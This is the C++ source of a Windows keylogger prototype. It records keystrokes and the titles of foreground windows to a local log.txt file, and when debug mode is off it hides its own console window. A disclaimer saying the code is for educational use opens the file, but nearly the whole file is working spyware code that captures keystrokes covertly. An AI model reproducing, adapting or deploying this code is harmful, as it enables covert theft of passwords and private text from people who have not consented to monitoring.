/*
C++ Prototype Keylogger using GetAsyncKeyState, GetKeyState and GetWindowText
Created by Martin Georgiev, geeorgiev[at]gmail.com

DISCLAIMER: THE AUTHOR DOES NOT CONDONE THE USE OF THIS PROGRAM FOR ANY
ILLEGAL OR OTHERWISE INTRUSIVE APPLICATION THAT MIGHT HARM OTHERS PRIVACY.
USE AT YOUR OWN RISK! NO WARRANTIES OR GUARANTIES ARE GIVEN FOR THIS PROGRAM.

The below code is for personal use and educational purposes
Please, do not do anything stupid & don't be evil!

// user32.cpp : Defines the entry point for the console application.
*/

#include "stdafx.h"
#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <iostream>
#include <fstream>
#include <string>

using namespace std;

// GLOBAL Variables
// Choose whether console window should be visible for debug
const bool DEBUG = true; 

std::string key;
std::string bullet = ">---------------------------------------------------\n\n";

// Activated after Shift is pressed
bool catchShift(); 
// Checks for CapsLock activation
bool capsLock();

// Window handlers
void saveLastHWND();
bool isSameHWND();
LPWSTR HWNDName;
LPWSTR lastHWND;


// Main handle
int main()
{
	saveLastHWND();
	PWinTitle(lastHWND);

	if (!DEBUG) {
		ShowWindow(GetConsoleWindow(), SW_HIDE);
	}

	user32();

	return 0;
}

/*
Storing keyboard data in a log.txt file
Will show DEBUG in the console windows if set to true
*/
void log(string input) {
	fstream LogFile;
	LogFile.open("log.txt", fstream::app);
	if (DEBUG) {
		cout << key;
	}
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

void saveLastHWND() {
	HWND hwnd = GetForegroundWindow();
	int buffsize = GetWindowTextLength(hwnd) + 1;
	lastHWND = new WCHAR[buffsize];
	int window = GetWindowText(hwnd, lastHWND, buffsize);
}

bool isSameHWND() {
	HWND hwnd = GetForegroundWindow();
	int buffsize = GetWindowTextLength(hwnd) + 1;
	HWNDName = new WCHAR[buffsize];
	int window = GetWindowText(hwnd, HWNDName, buffsize);

	// Debug for windows title memory
	// wcout << windowName << endl;
	// wcout << lastWindow << endl;
	if (wcscmp(HWNDName,lastHWND) == 0) {
		return true;
	}
	else {
		return false;
	}
}


bool SKeyHook(int S_Key) {
	if (catchShift()) {
		switch (S_Key) {
			case '1': key = '!'; break;
			case '2': key = '@'; break;
			case '3': key = '#'; break;
			case '4': key = '$'; break;
			case '6': key = '^'; break;
			case '7': key = '&'; break;
			case '8': key = '*'; break;
			case '9': key = '('; break;
			case '0': key = ')'; break;
			case 186: key = ':'; break;
			case 189: key = '_'; break;
			case 192: key = '~'; break;
			case VK_SHIFT:  key = ""; break;
			case VK_RSHIFT:  key = ""; break;
			case VK_LSHIFT:  key = ""; break;

			default:
				return false;
		}
		log(key);
		return true;

	} else {
		switch (S_Key) {
			case VK_SPACE: key = " "; break;
			case VK_RETURN: key = "[ENTER]"; break;
			case VK_BACK:  key = "[b]"; break;
			case VK_RBUTTON:  key = ""; break;
			case VK_CAPITAL:  key = "[CapsLock]"; break;
			case VK_TAB: key = "[TAB]"; break;
			case 187: key = '='; break;
			case 188: key = ','; break;
			case 189: key = '-'; break;
			case 190: key = '.'; break;
			case 191: key = '/'; break;
			case 40: key = ' '; break;
			case 173: key = ' '; break;
			default:
				return false;
		}
		log(key);
		return true;
	}
}


bool capsLock() {
	if (GetKeyState(VK_CAPITAL) == 1) { 
		return true; 
	}
	if (GetKeyState(VK_CAPITAL) == -127) { 
		return true;
	}
	return false;
}


bool catchShift() {
	if (GetKeyState(VK_LSHIFT) < -120) {
		return true;
	}
	if (GetKeyState(VK_RSHIFT) < -120) {
		return true;
	}
	return false;
}

std::string MBFromW(LPCWSTR pwsz, UINT cp) {
	int cch = WideCharToMultiByte(cp, 0, pwsz, -1, 0, 0, NULL, NULL);

	char* psz = new char[cch];

	WideCharToMultiByte(cp, 0, pwsz, -1, psz, cch, NULL, NULL);

	std::string st(psz);
	delete[] psz;

	return st;
}

void PWinTitle(LPWSTR text) {

	std::string test = MBFromW(text, 0);

	if (DEBUG) {
		wprintf(L"\n\n >>> %s \n", text);
		cout << bullet;
	}
	
	log("\n\n >>> "+test+"\n"+ bullet);
}

void user32() {
	char KEY_PRESS = 'x';
	while (true) {
		Sleep(10);
		for (int KEY_PRESS = 8; KEY_PRESS <= 190; KEY_PRESS++)
		{
			if (GetAsyncKeyState(KEY_PRESS) == -32767) {
				if (!isSameHWND()) {
					PWinTitle(HWNDName);
				}
				saveLastHWND();

				if (SKeyHook(KEY_PRESS) == false) {
					if ((KEY_PRESS == 1) ||
						(KEY_PRESS == 2) ||
						(KEY_PRESS == 16) ||
						(KEY_PRESS == 17) ||
						(KEY_PRESS == 18) ||
						(KEY_PRESS == 3) ||
						(KEY_PRESS == 4) ||
						(KEY_PRESS == 37) ||
						(KEY_PRESS == 38) ||
						(KEY_PRESS == 39) ||
						(KEY_PRESS == 40)) {
						KEY_PRESS = 0;
					}

					fstream LogFile;
					LogFile.open("log.txt", fstream::app);
					if (LogFile.is_open()) {
						if ((KEY_PRESS >= 48 && KEY_PRESS <= 57) ||
							GetAsyncKeyState(VK_SHIFT) ||
							GetKeyState(VK_CAPITAL)) {
							LogFile << char(KEY_PRESS);
							if (DEBUG) {
								cout << char(KEY_PRESS);
							}
						}
						else {
							LogFile << char(KEY_PRESS + 32);
							if (DEBUG) {
								cout << char(KEY_PRESS + 32);
							}
						}

						LogFile.close();
					}

				}
			}
		}
	}
}
